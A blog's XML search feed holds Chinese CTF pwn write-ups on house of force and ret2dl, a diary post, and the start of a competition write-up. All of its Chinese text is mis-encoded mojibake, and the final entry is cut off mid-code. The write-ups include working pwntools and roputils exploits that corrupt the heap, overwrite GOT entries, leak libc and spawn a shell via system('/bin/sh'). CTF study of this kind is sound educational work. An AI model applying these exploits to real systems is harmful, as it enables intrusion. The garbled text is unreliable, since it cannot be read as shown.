<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å †åˆ©ç”¨ä¹‹house of force</title>
      <link href="/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/"/>
      <url>/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/</url>
      
        <content type="html"><![CDATA[<p>house of force æ˜¯ä¸€ç§å †çš„åˆ©ç”¨æ‰‹æ³•ï¼Œå¯ä»¥å®ç°å†…å­˜åœ°å€çš„è¯»å†™ã€‚</p><h2><span id="top-chunk-çš„åˆ†å‰²æœºåˆ¶">top chunk çš„åˆ†å‰²æœºåˆ¶</span></h2><p>top chunk æ˜¯å †å†…å­˜ç®¡ç†å™¨çš„åå¤‡ç©ºé—´ï¼Œå½“å„ bin ä¸­æ²¡æœ‰ chunk å¯ä»¥æä¾›æ—¶ï¼Œtop chunk ä¼šåˆ†å‰²å‡ºä¸€ä¸ª chunk ç»™ç”¨æˆ·ï¼Œä¸‹é¢ç»™å‡ºåˆ†å‰²è¿‡ç¨‹çš„æºç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>é¦–å…ˆæ˜¯ libc ä¼šæ£€æŸ¥ç”¨æˆ·ç”³è¯·çš„å¤§å°ï¼Œtop chunk ç»™ä¸ç»™å¾—èµ·ï¼›</li><li>å¦‚æœç»™å¾—èµ·ï¼Œå°±åœ¨ top chunk çš„ head å¤„ï¼Œ<strong>ä»¥ç”¨æˆ·ç”³è¯·å¤§å°æ‰€åŒ¹é…çš„ chunk å¤§å°ä¸ºåç§»é‡ï¼Œå°† top chunk çš„ä½ç½®æ¨åˆ°æ–°çš„ä½ç½®</strong>ï¼Œè€ŒåŸæ¥çš„ top chunk head å¤„å°±ä½œä¸ºæ–°çš„å †å—è¢«åˆ†é…ç»™ç”¨æˆ·äº†ï¼›</li></ol><p>å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ top chunk åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­åç§»åˆ°ä»»æ„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ç”¨æˆ·ç”³è¯·çš„å¤§å°ä¸ºä»»æ„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å°† top chunk åŠ«æŒåˆ°ä»»æ„å†…å­˜åœ°å€ï¼Œç„¶åå°±å¯ä»¥æ§åˆ¶ç›®æ ‡å†…å­˜ã€‚</p><hr><p><strong>ç®€è¨€ä¹‹</strong></p><ol><li>æº¢å‡ºå·²ç»åˆ†é…çš„ chunkï¼Œè¦†ç›–åˆ° top chunk çš„ size ä½ï¼›</li><li>ç®—å‡º top chunk ä¸ç›®æ ‡åœ°å€çš„è·ç¦»ï¼Œå°† top chunk ä½ç½®æ¨åˆ°ç›®æ ‡åœ°å€</li></ol><h2><span id="æº¢å‡º-top-chunk">æº¢å‡º top chunk</span></h2><p>å½“æˆ‘ä»¬ malloc ä¸€ä¸ªå †å—ï¼Œæ­¤å †å—çš„ä¸‹ä¸€ä¸ªå°±æ˜¯ top chunk æ—¶ï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„æ•°æ®å¤§å°èƒ½å¤Ÿè¶…è¿‡ç”³è¯·çš„å¤§å°ï¼Œå°±èƒ½å †æº¢å‡ºåˆ° top chunkï¼Œå½“æˆ‘ä»¬å°† top chunk çš„ size å­—æ®µæ”¹å¾—éå¸¸å¤§æ—¶å°±å¯ä»¥é€šè¿‡æ£€æŸ¥äº†ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šä¼ å…¥ -1 ï¼Œå› ä¸º ptmalloc çš„æºç ä¸­å¯¹äº size ä½¿ç”¨ unsigned long è¿›è¡Œå¼ºè½¬æŠ“æ¢ï¼Œè´Ÿæ•°ç”¨è¡¥ç è¡¨ç¤ºï¼Œå°† -1 å½“æˆæ— ç¬¦å·æ•°ä¸º 0xffffffffffffffff ï¼Œå·²ç»éå¸¸å¤§äº†ï¼Œç”¨äºç»•è¿‡ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) éªŒè¯ã€‚</p><h2><span id="ä¾‹é¢˜">ä¾‹é¢˜</span></h2><p>buu ä¸Šçš„ bcloud_bctf_2016</p><p>ç¨‹åºå¼€çš„ä¿æŠ¤å¦‚ä¸‹</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635751369496160/0bc4ec261d145b38518a3d6da6e1f2f8604df736.png"></p><p>æœ¬é¢˜æœ€å¤§çš„æ¼æ´å°±åœ¨è¿™ä¸¤ä¸ªå‡½æ•°ä¸­</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635754889755826/752b846ae81dff98b7c487e33f8e70cdb0a50d25.png" alt="image-20211101162129641"></p><p>func1</p><p>s å¤„è¾“å…¥ 0x40 ä¸ªå­—ç¬¦èƒ½å¤Ÿè¦†ç›–åˆ°æŒ‡é’ˆ v2 ï¼Œä¹‹åçš„å †åœ°å€åˆèµ‹ç»™äº† v2 ï¼Œæ„å‘³ç€ v2 å¤„ s çš„ 0æˆªæ–­å­—ç¬¦ è¢«è¦†ç›–æˆäº†å †æŒ‡é’ˆï¼Œä»è€Œåœ¨ strcpy å¤„å¯ä»¥æ³„éœ²å¤„å¯ä»¥æ³„éœ²å‡ºå †åœ°å€</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755409091509/ec1d1c267e74848e198785e209c21a650c95c04d.png" alt="image-20211101163008961"></p><p>func2 </p><p>ä¹Ÿæ˜¯åŒç†ï¼Œå¹¶ä¸”å› ä¸º v3 å’Œ s åªç›¸å·® 4 ä¸ªå­—ç¬¦çš„ç¼˜æ•…ï¼Œå¯ä»¥ä¿®æ”¹åˆ° top chunk çš„ size ä½</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755367270204/f1f8b1e48ac0581bc5e7f13e4eca57ba2b1cdad2.png" alt="image-20211101162927102"></p><p>ç”±äºç¨‹åºæ²¡æœ‰å¼€ pieï¼Œå› æ­¤ åœ°å€ä¹‹é—´çš„åç§»å¯ä»¥ç›´æ¥ç®—å‡ºæ¥ï¼Œè¾¾åˆ°äº† house of force çš„æ¡ä»¶ï¼Œè®¡ç®—å‡º top chunk å’Œ chunk_addr (heap array) çš„åœ°å€ï¼Œå°±å¯ä»¥å°† top chunk æŒ‡é’ˆ æŒ‡å‘ heap array ä»è€Œæ§åˆ¶æ•´ä¸ªå †æŒ‡é’ˆæ•°ç»„ï¼Œå®ç°ä»»æ„åœ°å€çš„è¯»å†™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;27866&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;2.23/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">leng,con</span>):</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:&#x27;</span>,p32(<span class="number">0xFFFFFFFF</span>))<span class="comment">#ä¿®æ”¹top chunkçš„size</span></span><br><span class="line">top_chunk = leak + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;top_chunk: &quot;</span> + <span class="built_in">hex</span>(top_chunk)</span><br><span class="line">chunk_addr = <span class="number">0x0804B120</span></span><br><span class="line">offset = chunk_addr - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">&#x27; &#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç°åœ¨top chunkç§»åˆ°äº†heap_array_addr-0x8å¤„ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶heap_arrayäº†</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹heap_array</span></span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#ä¿®æ”¹freeçš„gotè¡¨ä¸ºputsçš„pltè¡¨</span></span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#æ³„éœ²putsçš„åœ°å€</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got: &quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase  = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase)</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥</p><p><a href="https://blog.csdn.net/haibiandaxia/article/details/108260537">https://blog.csdn.net/haibiandaxia/article/details/108260537</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105588058">https://blog.csdn.net/seaaseesa/article/details/105588058</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‡¡æ˜¯è¿‡å¾€ï¼Œçš†ä¸ºåºç« </title>
      <link href="/2021/10/30/%E5%87%A1%E6%98%AF%E8%BF%87%E5%BE%80%EF%BC%8C%E7%9A%86%E4%B8%BA%E5%BA%8F%E7%AB%A0/"/>
      <url>/2021/10/30/%E5%87%A1%E6%98%AF%E8%BF%87%E5%BE%80%EF%BC%8C%E7%9A%86%E4%B8%BA%E5%BA%8F%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰çš„ butterfly ä¸»é¢˜å¤ªéš¾ç”¨äº†ï¼Œçœ‹åˆ°å­¦é•¿ä»–ä»¬ç”¨çš„æ–°ä¸»é¢˜ï¼Œæ„Ÿè§‰å¾ˆç®€çº¦ï¼Œæ‰€ä»¥å°±æ¢äº†è¿™ä¸ªä¸»é¢˜</p><p>ä¸€ç›´æ²¡æœ‰æ›´æ–°åšå®¢æ˜¯å› ä¸ºä¸ä¼šç”¨ markdown ï¼Œå½“æ—¶å•¥éƒ½ä¸æ‡‚ï¼ŒåŒ…æ‹¬å›¾ç‰‡å¤„ç†ä»€ä¹ˆçš„ï¼Œæ¯æ¬¡å†™åšå®¢éƒ½å¾ˆéº»çƒ¦ï¼Œåˆä¸å¥½æ„æ€è¯·æ•™åˆ«äººï¼Œæ‰€ä»¥å°±éƒ½å†™åœ¨ OneNote ä¸Šäº†ï¼ˆä¸å¾—ä¸è¯´èƒ½ç›´æ¥ç²˜å›¾ç‰‡è¿˜æœ‰éšæ—¶åŒæ­¥ä»€ä¹ˆçš„æ˜¯çœŸçš„æ–¹ä¾¿ï¼Œå¾®è½¯æ‰“é’±ï¼ï¼‰ï¼Œä½†æ˜¯æ ¼å¼ä¹Ÿæ˜¯ä¸ªå¾ˆå¤§çš„å¼Šç«¯ï¼Œä¹Ÿæ²¡æœ‰æ”¯æŒä»£ç çš„æ’å…¥ï¼Œè™½ç„¶å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯ä¸å¥½çœ‹ã€‚</p><p>å’Œå­¦é•¿ä»–ä»¬æ··ç†Ÿäº†ä¹‹åæ•™ä¼šäº†æˆ‘å¾ˆå¤šéªšæ“ä½œï¼ˆå­¦é•¿ä»¬éƒ½æ˜¯è¶…äººï¼ï¼ï¼ï¼‰ï¼Œæ„Ÿè§‰è‡ªå·±è¿™åå‡ å¹´ä¸€ç›´åœ¨ç”¨è€äººæœºï¼Œç°åœ¨ä¼šç”¨äº†ï¼Œä»¥åä¼šæ…¢æ…¢æŠŠæ–‡ç« æŒªè¿‡æ¥çš„ã€‚</p><hr><p>æ€»ç»“ä¸€ä¸‹è¿‡å»å§ï¼Œæ„Ÿè§‰æ•´ä¸ªå¤§ä¸€ä¸‹éƒ½æŒºæ‘¸é±¼çš„ï¼Œå› ä¸ºä¸€äº›ä¸ªäººåŸå› ï¼Œéƒ½æ²¡æ€ä¹ˆé™ä¸‹å¿ƒæ¥å­¦ç½‘å®‰ï¼Œç°åœ¨æƒ³æƒ³å½“æ—¶çš„è‡ªå·±æŒºä¸è´Ÿè´£çš„ï¼Œè¾œè´Ÿäº†è‡ªå·±å¯¹ç½‘å®‰çš„çƒ­çˆ±ï¼Œä¹Ÿè¾œè´Ÿäº†ä»¥å‰çš„åŠªåŠ›ï¼Œä¸è¿‡é‚£ä»¶äº‹è¿‡å»ä¹‹åè‡ªå·±ä¹Ÿæˆç†Ÿäº†å¾ˆå¤šï¼Œä¹Ÿç®—æ˜¯ä¸€ç§ç»å†å§ã€‚</p><p>æš‘å‡å»æ—…äº†æ¬¡æ¸¸ï¼Œä¹Ÿç®—æ˜¯ç»™è‡ªå·±ä¸€ä¸ªç¼“å†²æœŸäº†ï¼Œç„¶åä¹Ÿä¸€ç›´åœ¨å­¦ï¼Œè™½ç„¶çŸ¥é“è¿‡å»ä¸¢ä¸‹çš„éƒ½å¼¥è¡¥ä¸å›äº†ï¼Œä½†æ˜¯ä¹Ÿç®—æ˜¯æœ‰æ‰€æ”¹å˜äº†ï¼Œè¿·è¿·ç³Šç³Šçš„è¿›äº† V&amp;N ï¼Œå¤§äºŒä¸Šå¼€å§‹é™†é™†ç»­ç»­æ‰“è¿›ä¸€äº›æ¯”èµ›çš„çº¿ä¸‹ï¼Œé‡å¿ƒä¹Ÿæ…¢æ…¢å¼€å§‹åå‘ç½‘å®‰äº†ï¼ŒçŠ¶æ€ä¹Ÿé€æ¸å˜å¾—å’Œæœ€å¼€å§‹ä¸€æ ·äº†ï¼Œæ¯å¤©éƒ½å¾ˆå……å®ï¼Œä¸€åˆ‡éƒ½åœ¨æ…¢æ…¢å˜å¥½ã€‚</p><p>å¤§äºŒå°±è¦æ¥ç®¡ç»„é•¿è¿™ä¸€èŒäº†ï¼Œæ˜¯æœºé‡ä¹Ÿæ˜¯æŒ‘æˆ˜ï¼Œå¸Œæœ›èƒ½åœ¨å †å †å’Œå“å“¥é‚£å¤šå­¦ç‚¹ï¼Œå’Œè±ªğŸ‘´ç»è¥å¥½æ•´ä¸ªç»„å§ï¼Œä¹Ÿå¸Œæœ›ç½‘å®‰ç»„èƒ½ä¸€ç›´å¾ˆå¥½çš„èµ°ä¸‹å»â€¦â€¦</p><p>æœªå®Œå¾…ç»­â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> å°æ—¥è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ—¥è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dl</title>
      <link href="/2021/10/30/Ret2dl/"/>
      <url>/2021/10/30/Ret2dl/</url>
      
        <content type="html"><![CDATA[<p>æŒºéš¾çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œçœ‹äº†ä¸¤å¤©ä¹Ÿåªå¼„æ‡‚ä¸€ç‚¹çš®æ¯›ï¼Œæ„Ÿè§‰è¿˜æ˜¯å› ä¸ºæœ€åº•å±‚çš„ä¸œè¥¿æ²¡æœ‰å¼„æ‡‚å¯¼è‡´ç†è§£å›°éš¾</p><p><strong>ä½¿ç”¨æƒ…æ™¯ï¼š</strong>libcåœ°å€ä¸å¥½æ³„éœ²ï¼Œä¹Ÿæ²¡æœ‰å…¶ä»–çš„æ¼æ´ï¼Œä½†æ˜¯å¯ä»¥æ ˆæº¢å‡º</p><p><strong>åŸç†</strong></p><p>é¦–å…ˆéœ€è¦äº†è§£ELFæ–‡ä»¶ç»“æ„ä»¥åŠåŠ¨æ€é“¾æ¥ç›¸å…³çŸ¥è¯†</p><p>å½“ç¨‹åºè¿›è¡ŒåŠ¨æ€é“¾æ¥æ—¶ï¼Œä¸ºäº†èƒ½å¤Ÿå‡å°‘èµ„æºçš„æµªè´¹åŠ¨æ€é“¾æ¥å°†è¿æ¥çš„è¿‡ç¨‹æ¨è¿Ÿåˆ°äº†è¿è¡Œçš„æ—¶å€™ï¼Œå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œç¨‹åºä¼šæŸ¥æ‰¾éœ€è¦é“¾æ¥çš„å„ç§ä¿¡æ¯ï¼Œå†é€šè¿‡_dl_runtime_resolveè¿™ä¸ªå‡½æ•°å°†æ­£ç¡®çš„åœ°å€å†™è¿›got.pltè¡¨ä¸­ï¼Œç¬¬äºŒæ¬¡æŸ¥è¯¢çš„æ—¶å€™å°±ä¸éœ€è¦å†èµ°ä¸€éè¿™ä¸ªè¿‡ç¨‹äº†ï¼Œç›´æ¥å°±å¯ä»¥è°ƒç”¨å‡½æ•°ï¼ˆè¯¦è§å‚è€ƒåšå®¢ï¼‰</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›¸åº”çš„å‚æ•°ä»¥åŠå…¶å¯¹åº”åœ°å€çš„å†…å®¹æ˜¯ä¸æ˜¯å°±å¯ä»¥æ§åˆ¶è§£æçš„å‡½æ•°äº†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚</p><p><strong>åŠ¨æ€é“¾æ¥è¿‡ç¨‹</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588207298627/20b1708fb00c75422f0e0de71ca3a50c5804b6d8.png" alt="1"></p><p>è€Œæ•´ä¸ªdlå‡½æ•°çš„è¿‡ç¨‹å…¥ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588245719719/d078ccc1c92f9b6d92cc23e5a1e218e31b7ceef0.png" alt="2"></p><p><strong>æ•´ä¸ªè¿‡ç¨‹è¯´ç™½äº†å°±æ˜¯ï¼š</strong></p><ol><li>å…ˆä» .rel.plt è¡¨é‡Œæ‰¾åˆ°æŸä¸ªå‡½æ•°åœ¨ .dynsym é‡Œçš„åç§»</li><li>å†ä» .dynsym ç¬¦å·è¡¨é‡Œæ‰¾å‡½æ•°åœ¨ .dynstr è¡¨é‡Œçš„åç§»</li><li>å†ä» .dynstr è¡¨é‡Œæ‰¾åˆ°å…·ä½“çš„å‡½æ•°å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œç„¶åå°†è¿™ä¸ªå­—ç¬¦ä¸²è§£ææˆå‡½æ•° </li></ol><p> <strong>è€Œæˆ‘ä»¬çš„æ”»å‡»æ–¹å¼å°±æ˜¯ä¼ªé€ æ‰€è°“çš„è¡¨ï¼Œç„¶åå°†æˆ‘ä»¬ä¼ªé€ è¡¨çš„åç§»å½“å‚æ•°ä¼ å…¥ï¼Œè¿™æ ·çš„è¯ï¼Œä»–å°±ä¼šè§£æåˆ°æˆ‘ä»¬æƒ³éœ€è¦çš„å‡½æ•°äº†</strong></p><p> <strong>æ”»å‡»:</strong></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä¸ª dl å‡½æ•°ä¸»è¦æ˜¯åˆ©ç”¨äº†ä¸‰ä¸ªè¡¨</p><ul><li>.rel.plt</li><li>.dynsym</li><li>dynstr</li></ul><p>é‚£æˆ‘ä»¬è¦åšçš„å°±æ˜¯ä¼ªé€ è¿™ä¸‰ä¸ªè¡¨ï¼Œå°†æˆ‘ä»¬ä¼ªé€ è¡¨çš„åç§»å½“å‚æ•°ä¼ å…¥ï¼Œè¿™æ ·å®ƒå°±ä¼šè§£ææˆ‘ä»¬æƒ³è¦çš„å‡½æ•°äº†</p><p>å½“ç„¶ä¹Ÿå¯ä»¥å·¥å…·ä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context </span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">r.recv() </span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">offset = <span class="number">112</span> </span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>) </span><br><span class="line">buf = rop.fill(offset) </span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) </span><br><span class="line"><span class="comment">## used to call dl_runtimeresolve() </span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) </span><br><span class="line">r.send(buf) buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf) </span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str </span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"> r.send(buf) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p> <strong>å‚è€ƒé“¾æ¥</strong></p><p> <a href="https://blog.csdn.net/qq_41202237/article/details/107378159">https://blog.csdn.net/qq_41202237/article/details/107378159</a></p><p> <a href="https://xz.aliyun.com/t/5122">https://xz.aliyun.com/t/5122</a></p><p> <a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¥¥äº‘æ¯wp</title>
      <link href="/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/"/>
      <url>/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1><span id="note">Note</span></h1><h2><span id="æ³•ä¸€">æ³•ä¸€</span></h2><p>æ•´ä¸ªç¨‹åºæ²¡æœ‰ free åŠŸèƒ½ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ° house of orange</p><p>Say å‡½æ•°é‡Œæœ‰ scanf(buf)</p><p>scanf(buf) å¯ä»¥é€šè¿‡ %n$s æ¥å®ç° stackåœ°å€ä¸Šä»»æ„ä¹¦å†™</p><p>åˆ©ç”¨ scanf æ ¼å¼åŒ–æ¼æ´æ”¹ topchunk åœ°å€ä»è€Œè§¦å‘ house of orange</p><p>å†åˆ©ç”¨scanfæ¼æ´åœ¨mallocä¸­å†™å…¥reallocï¼Œåœ¨reallocä¸­å†™å…¥og</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 